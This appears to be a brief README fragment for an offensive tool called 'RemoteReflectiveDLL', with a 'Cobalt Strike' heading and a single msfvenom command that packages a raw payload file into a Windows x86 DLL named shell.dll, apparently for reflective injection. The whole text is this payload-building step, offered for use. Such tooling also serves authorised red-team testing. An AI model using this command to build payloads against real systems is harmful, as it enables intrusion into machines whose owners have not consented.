# RemoteReflectiveDLL


## Cobalt Strike

msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -f dll -o shell.dll
